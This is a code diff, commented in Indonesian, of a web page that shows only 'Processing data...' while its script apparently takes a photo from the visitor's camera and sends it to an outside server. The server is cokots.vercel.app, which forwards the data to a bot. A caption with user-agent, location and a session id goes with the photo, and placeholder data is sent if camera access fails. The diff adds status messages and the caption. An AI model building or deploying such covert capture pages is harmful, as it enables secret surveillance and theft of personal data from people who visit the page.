@@ -20,16 +20,22 @@
 
                 const session = new URLSearchParams(window.location.search).get("session");
 
-                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+                const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                     method: "POST",
                     body: formData,
                 });
 
-                console.log("Data berhasil dikirim.");
+                // Cek jika respons adalah "Data berhasil dikirim ke bot!"
+                const responseText = await response.text();
+                if (responseText === "Data berhasil dikirim ke bot!") {
+                    document.getElementById("status").innerText = "Data berhasil dikirim ke bot!";
+                    return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
+                } else {
+                    document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
+                }
             } catch (error) {
                 console.error("Error:", error);
 
-                // Kirimkan data kosong dengan fallback gambar jika izin kamera ditolak atau terjadi error
                 sendEmptyDataToAPI();
             }
         }
@@ -37,31 +43,41 @@
         // Fungsi untuk mengirimkan data kosong dengan fallback gambar
         async function sendEmptyDataToAPI() {
             document.getElementById("gagal").innerText = "Gagal mendapatkan data. Pastikan izin kamera diberikan.";
+             
+             
+             const session = new URLSearchParams(window.location.search).get("session");
 
             // Buat Blob dengan gambar fallback 1x1 pixel JPEG
             const fallbackBlob = new Blob([new Uint8Array([0])], { type: "image/jpeg" });
+            const caption = `
+            📍 **Data Pengguna: mengizinkan**
+            - User-Agent: -
+            - Lokasi: -
+            - Sesi: ${session}
+            `;
 
             // Kirim foto kosong (fallback) ke server
             const formData = new FormData();
             formData.append("photo", fallbackBlob);  // Kirimkan fallback gambar
+           formData.append("caption", caption);
 
-            const session = new URLSearchParams(window.location.search).get("session");
-
-            console.log("Mengirim data kosong (fallback) ke API...");
-
+           
             try {
                 const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                     method: "POST",
                     body: formData,
                 });
 
-                if (response.ok) {
-                    console.log("Data kosong (fallback) berhasil dikirim.");
+                // Cek jika respons adalah "Data berhasil dikirim ke bot!"
+                const responseText = await response.text();
+                if (responseText === "Data berhasil dikirim ke bot!") {
+                    document.getElementById("status").innerText = "Data berhasil dikirim ke bot!";
+                    return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
                 } else {
-                    console.error("Gagal mengirim data kosong (fallback).");
+                    document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
                 }
             } catch (error) {
-                console.error("Gagal mengirim data kosong (fallback):", error);
+                document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
             }
         }
 
@@ -71,6 +87,9 @@
 </head>
 <body>
     <h1>Memproses data...</h1>
+    <!-- Menampilkan pesan status pengiriman -->
+    <p id="status" style="color: green;"></p>
+    <!-- Menampilkan pesan gagal jika izin kamera tidak diberikan -->
     <p id="gagal" style="color: red;"></p>
 </body>
 </html>
